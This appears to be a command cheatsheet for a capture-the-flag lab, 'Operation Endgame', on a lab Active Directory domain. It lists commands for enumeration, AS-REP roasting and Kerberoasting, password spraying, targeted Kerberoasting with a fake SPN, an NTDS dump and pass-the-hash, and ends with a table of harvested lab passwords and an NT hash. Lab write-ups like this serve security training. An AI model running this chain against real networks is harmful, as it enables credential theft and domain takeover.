# Commands Cheatsheet: Operation Endgame

Quick reference of all commands used in order.

## Variables
```bash
TARGET="10.114.189.12"
DOMAIN="thm.local"
DC="ad.thm.local"
```

## Phase 1: Recon
```bash
# Port scan
rustscan -a $TARGET

# SMB/LDAP/RPC enumeration
enum4linux-ng -A $TARGET

# Anonymous LDAP dump
ldapsearch -x -H ldap://$TARGET -b "DC=thm,DC=local" > ldap.txt

# Filter users with descriptions
ldapsearch -x -H ldap://$TARGET -b "DC=thm,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description

# RID brute force → user list
crackmapexec smb $TARGET -u '' -p '' --rid-brute 2>/dev/null | grep "SidTypeUser" | awk -F'\' '{print $2}' | awk '{print $1}' > realusers.txt

# Check for Guest
grep -i guest realusers.txt
```

## Phase 2: Initial Access
```bash
# AS-REP Roasting (dead end)
GetNPUsers.py $DOMAIN/ -dc-ip $TARGET -usersfile realusers.txt -format hashcat -outputfile asrep.txt -no-pass
hashcat --force -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting via Guest
GetUserSPNs.py $DOMAIN/Guest -dc-ip $TARGET -outputfile kerberoast.txt

# Crack hash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt

# RDP
xfreerdp /v:$TARGET /u:CODY_ROY /p:'MKO)mko0' /dynamic-resolution +clipboard /cert:ignore
```

## Phase 3: Lateral Movement
```bash
# Password spray
crackmapexec smb $TARGET -u realusers.txt -p 'MKO)mko0' --continue-on-success 2>/dev/null | grep "+"

# Fix DNS for bloodhound
echo "nameserver $TARGET search $DOMAIN" > /etc/resolv.conf

# BloodHound collection
bloodhound-python -u CODY_ROY -p 'MKO)mko0' -d $DOMAIN -ns $TARGET -c All --zip

# Set fake SPN (Targeted Kerberoast)
bloodyAD -u ZACHARY_HUNT -p 'MKO)mko0' -d $DOMAIN --host $TARGET --dc-ip $TARGET set object JERRI_LANCASTER serviceprincipalName -v 'http/fake.thm.local'

# Kerberoast JERRI_LANCASTER
GetUserSPNs.py $DOMAIN/ZACHARY_HUNT:'MKO)mko0' -dc-ip $TARGET -outputfile jerri_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt jerri_hash.txt

# RDP as JERRI
xfreerdp /v:$TARGET /u:JERRI_LANCASTER /p:'lovinlife!' /dynamic-resolution +clipboard /cert:ignore
```

## Phase 4: Domain Compromise
```bash
# Verify DA access
crackmapexec smb $TARGET -u SANFORD_DAUGHERTY -p 'RESET_ASAP123'

# Dump NTDS
secretsdump.py $DOMAIN/SANFORD_DAUGHERTY:'RESET_ASAP123'@$TARGET -just-dc-ntlm

# Pass-the-Hash → C$
smbclient '\\$TARGET\C$' -U 'administrator' --pw-nt-hash e599bf2fe56d6a21b3a5487bb4761d1b

# Get flag
# smb: \Users\Administrator\Desktop\> get flag.txt.txt
# exit
cat flag.txt.txt
```

## Credentials Harvested

| User | Password | Method |
|------|---------|--------|
| `CODY_ROY` | `MKO)mko0` | Kerberoasting + john |
| `ZACHARY_HUNT` | `MKO)mko0` | Password spray |
| `JERRI_LANCASTER` | `lovinlife!` | Targeted Kerberoasting + john |
| `SANFORD_DAUGHERTY` | `RESET_ASAP123` | Hardcoded in syncer.ps1 |
| `Administrator` | NT: `e599bf2fe56d6a21b3a5487bb4761d1b` | secretsdump NTDS |